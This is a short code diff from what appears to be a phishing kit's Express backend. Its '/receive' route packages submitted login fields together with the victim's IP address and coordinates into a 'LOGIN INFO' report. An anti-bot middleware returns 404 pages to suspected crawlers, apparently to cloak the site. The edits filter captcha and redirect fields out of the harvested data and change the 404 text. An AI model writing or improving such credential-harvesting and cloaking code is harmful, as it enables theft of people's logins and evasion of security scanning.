@@ -86,11 +86,11 @@ app.post('/receive', async (req, res) => {
                `👤 LOGIN INFO\n\n`;
 
     for (let key of myObjects) {
-    	
+    	if(key != "_CAPTCHA" && key != "_NEXT" ){ 
       console.log(`${key}: ${myObject[key]}`);
       message += `${key.toUpperCase()}: ${myObject[key]}\n`;
+    	}
     }
-    
     message += `🌍 GEO-IP INFO\n` +
 		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
         `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
@@ -208,7 +208,7 @@ async function antiBotMiddleware(req, res, next) {
     const clientRef = req.headers.referer || req.headers.origin;
 
     if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
-        return res.status(404).send('Not Found');
+        return res.status(404).send('404 Not Found');
     } else {
     	
     	try {
